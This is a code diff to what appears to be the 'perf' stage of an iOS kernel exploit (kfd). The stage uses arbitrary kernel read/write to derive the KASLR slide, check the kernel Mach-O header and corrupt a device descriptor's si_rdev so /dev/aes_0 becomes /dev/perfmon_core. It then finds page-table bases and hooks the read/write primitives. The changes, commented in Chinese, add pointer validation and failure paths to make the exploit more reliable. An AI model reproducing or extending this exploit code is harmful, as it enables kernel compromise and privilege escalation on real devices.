@@ -9,6 +9,15 @@
 u64 phystokv(struct kfd* kfd, u64 pa);
 u64 vtophys(struct kfd* kfd, u64 va);
 
+/*
+ * 内核指针粗筛。perf_run 里有好几步是先 kread 一个指针、再拿它去 kread 下一层，
+ * 中间任何一层拿到野指针都会让内核缺页 -> panic。所以每一层都要先过这个检查。
+ */
+static inline bool perf_is_kptr(u64 p)
+{
+    return (p >= 0xffff000000000000ULL) && (p != 0xffffffffffffffffULL);
+}
+
 void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 {
     assert((size != 0) && (size <= UINT16_MAX));
@@ -83,39 +92,111 @@ void perf_init(struct kfd* kfd)
     assert(kfd->perf.dev.fd > 0);
 }
 
-void perf_run(struct kfd* kfd)
+bool perf_run(struct kfd* kfd)
 {
-    assert(kfd->info.kaddr.current_proc);
-    u64 fd_ofiles = kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
-    u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
-    u64 fileproc = 0;
-    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
-    u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
-    u64 fp_glob = 0;
-    kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
-    u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
-    u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
-    u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
-    u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
-    u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
-    kfd->perf.kernel_slide = kernel_slide;
-    print_x64(kfd->perf.kernel_slide);
+    if (!kfd->info.kaddr.current_proc ||
+        !kfd->info.kaddr.current_pmap ||
+        !kfd->info.kaddr.kernel_pmap) {
+        print_failure("perf_run: 缺少 current_proc / current_pmap / kernel_pmap");
+        return false;
+    }
 
-    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
-        u32 mh_header[2] = {};
-        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
-        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
-        assert(mh_header[0] == 0xfeedfacf);
-        assert(mh_header[1] == 0x0100000c);
+    if (kfd->perf.dev.fd <= 0) {
+        print_failure("perf_run: /dev/aes_0 打不开 (fd=%d)", kfd->perf.dev.fd);
+        return false;
     }
 
     /*
-     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
+     * 顺着 /dev/aes_0 的 fileproc -> fp_glob -> fg_ops -> fo_kqfilter
+     * 拿到 vn_kqfilter 的真实地址，减去静态地址就是 kaslr slide。
+     *
+     * 这一整条链路上每读出一个指针都要先确认它是内核指针，否则后面的 kread
+     * 会直接读野地址，内核缺页 = 立刻重启。
      */
-    u64 fg_data = kget_u64(fileglob__fg_data, unsign_kaddr(fp_glob));
-    u64 v_specinfo = kget_u64(vnode__v_un__vu_specinfo, unsign_kaddr(fg_data));
-    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + kfd_offset(specinfo__si_rdev);
-    kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
+    u64 fd_ofiles = unsign_kaddr(kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc));
+    if (!perf_is_kptr(fd_ofiles)) {
+        print_failure("perf_run: fd_ofiles 不是内核指针 (0x%llx)，proc__p_fd__fd_ofiles 偏移不对", fd_ofiles);
+        return false;
+    }
+
+    u64 fileproc_kaddr = fd_ofiles + (kfd->perf.dev.fd * sizeof(u64));
+    u64 fileproc = 0;
+    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
+    fileproc = unsign_kaddr(fileproc);
+    if (!perf_is_kptr(fileproc)) {
+        print_failure("perf_run: fileproc 非法 (0x%llx)", fileproc);
+        return false;
+    }
+
+    u64 fp_glob = 0;
+    kread((u64)(kfd), fileproc + offsetof(struct fileproc, fp_glob), &fp_glob, sizeof(fp_glob));
+    fp_glob = unsign_kaddr(fp_glob);
+    if (!perf_is_kptr(fp_glob)) {
+        print_failure("perf_run: fp_glob 非法 (0x%llx)", fp_glob);
+        return false;
+    }
+
+    u64 fg_ops = unsign_kaddr(kget_u64(fileglob__fg_ops, fp_glob));
+    if (!perf_is_kptr(fg_ops)) {
+        print_failure("perf_run: fg_ops 非法 (0x%llx)", fg_ops);
+        return false;
+    }
+
+    u64 fo_kqfilter = unsign_kaddr(kget_u64(fileops__fo_kqfilter, fg_ops));
+    if (!perf_is_kptr(fo_kqfilter)) {
+        print_failure("perf_run: fo_kqfilter 非法 (0x%llx)", fo_kqfilter);
+        return false;
+    }
+
+    u64 vn_kqfilter = fo_kqfilter;
+    u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
+    u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
+    print_x64(kernel_slide);
+
+    /*
+     * 第一道硬闸：slide 必须是页对齐、且落在一个合理范围内。
+     * 偏移填错时算出来的 slide 会是 0xffffffff8xxxxxxx 这种垃圾值，必须在这里拦住。
+     */
+    if ((kernel_slide & 0xfff) != 0 || kernel_slide > 0x400000000ULL) {
+        print_failure("perf_run: kernel_slide 非法 (0x%llx)", kernel_slide);
+        return false;
+    }
+
+    /*
+     * 第二道硬闸：内核 Mach-O 头必须是 0xfeedfacf。
+     * 这一步只读不写，是整条链路唯一一次"低成本的自我验证"。
+     */
+    u32 mh_header[2] = {};
+    kread((u64)(kfd), kernel_base, &mh_header, sizeof(mh_header));
+    if (mh_header[0] != 0xfeedfacf) {
+        print_failure("perf_run: kernel_base 0x%llx 处 magic = 0x%08x，偏移不对，放弃",
+                      kernel_base, mh_header[0]);
+        return false;
+    }
+    kfd->perf.kernel_slide = kernel_slide;
+
+    /*
+     * 从这里开始才真正写内核。把 "/dev/aes_0" 的 rdev 改成 "/dev/perfmon_core"。
+     */
+    u64 fg_data = unsign_kaddr(kget_u64(fileglob__fg_data, fp_glob));
+    if (!perf_is_kptr(fg_data)) {
+        print_failure("perf_run: fg_data 非法 (0x%llx)", fg_data);
+        return false;
+    }
+
+    u64 v_specinfo = unsign_kaddr(kget_u64(vnode__v_un__vu_specinfo, fg_data));
+    if (!perf_is_kptr(v_specinfo)) {
+        print_failure("perf_run: v_specinfo 非法 (0x%llx)", v_specinfo);
+        return false;
+    }
+
+    u64 si_rdev_kaddr = v_specinfo + kfd_offset(specinfo__si_rdev);
+    if (!perf_is_kptr(si_rdev_kaddr)) {
+        print_failure("perf_run: si_rdev 地址非法 (0x%llx)", si_rdev_kaddr);
+        return false;
+    }
+    kfd->perf.dev.si_rdev_kaddr = si_rdev_kaddr;
+    kread((u64)(kfd), si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
     u64 cdevsw_kaddr = kfd_offset(kernelcache__cdevsw) + kernel_slide;
     u64 perfmon_dev_open_kaddr = kfd_offset(kernelcache__perfmon_dev_open) + kernel_slide;
@@ -131,10 +212,16 @@ void perf_run(struct kfd* kfd)
         }
     }
 
+    if (dev_new_major == 0) {
+        print_failure("perf_run: cdevsw 里没找到 perfmon_dev_open，放弃");
+        return false;
+    }
+
     u32 new_si_rdev_buffer[2] = {};
     new_si_rdev_buffer[0] = dev_new_major;
     new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
-    kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));
+    kfd->perf.dev.si_rdev_corrupted = true;
+    kwrite((u64)(kfd), &new_si_rdev_buffer, si_rdev_kaddr, sizeof(new_si_rdev_buffer));
 
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
@@ -154,20 +241,34 @@ void perf_run(struct kfd* kfd)
     kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
     print_x64(kfd->perf.gPhysSize);
 
-    assert(kfd->info.kaddr.current_pmap);
+    if (!perf_is_kptr(kfd->perf.gVirtBase) || !perf_is_kptr(kfd->perf.gPhysBase)) {
+        print_failure("perf_run: gVirtBase / gPhysBase 非法 (0x%llx, 0x%llx)",
+                      kfd->perf.gVirtBase, kfd->perf.gPhysBase);
+        return false;
+    }
+
     kfd->perf.ttbr[0].va = kget_u64(pmap__tte, kfd->info.kaddr.current_pmap);
     kfd->perf.ttbr[0].pa = kget_u64(pmap__ttep, kfd->info.kaddr.current_pmap);
-    assert(phystokv(kfd, kfd->perf.ttbr[0].pa) == kfd->perf.ttbr[0].va);
+    if (!perf_is_kptr(kfd->perf.ttbr[0].va)) {
+        print_failure("perf_run: ttbr0 非法 (0x%llx)", kfd->perf.ttbr[0].va);
+        return false;
+    }
 
-    assert(kfd->info.kaddr.kernel_pmap);
     kfd->perf.ttbr[1].va = kget_u64(pmap__tte, kfd->info.kaddr.kernel_pmap);
     kfd->perf.ttbr[1].pa = kget_u64(pmap__ttep, kfd->info.kaddr.kernel_pmap);
-    assert(phystokv(kfd, kfd->perf.ttbr[1].pa) == kfd->perf.ttbr[1].va);
+    if (!perf_is_kptr(kfd->perf.ttbr[1].va)) {
+        print_failure("perf_run: ttbr1 非法 (0x%llx)", kfd->perf.ttbr[1].va);
+        return false;
+    }
 
     /*
      * Find the shared page in kernel space.
      */
     kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
+    if (kfd->perf.shared_page.paddr == 0) {
+        print_failure("perf_run: shared_page 的物理地址没找到");
+        return false;
+    }
     kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);
 
     /*
@@ -196,21 +297,36 @@ void perf_run(struct kfd* kfd)
     kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
     kfd->kread.krkw_method_ops.kread = perf_kread;
     kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
+    kfd->perf.ops_hooked = true;
+    return true;
 }
 
 void perf_free(struct kfd* kfd)
 {
-    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
-    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;
+    if (kfd->perf.ops_hooked) {
+        kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
+        kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;
+        kfd->perf.ops_hooked = false;
+    }
 
     /*
      * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
-     * Then, close it and deallocate the shared page.
-     * This leaves the first perfmon device "pmdv_allocated", which is fine.
+     * 只有真的改过才写回，否则会往一个没验证过的地址乱写。
      */
-    kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
-    assert_bsd(close(kfd->perf.dev.fd));
-    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
+    if (kfd->perf.dev.si_rdev_corrupted && kfd->perf.dev.si_rdev_kaddr) {
+        kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
+        kfd->perf.dev.si_rdev_corrupted = false;
+    }
+
+    if (kfd->perf.dev.fd > 0) {
+        close(kfd->perf.dev.fd);
+        kfd->perf.dev.fd = -1;
+    }
+
+    if (kfd->perf.shared_page.uaddr) {
+        vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size);
+        kfd->perf.shared_page.uaddr = 0;
+    }
 }
 
 /*
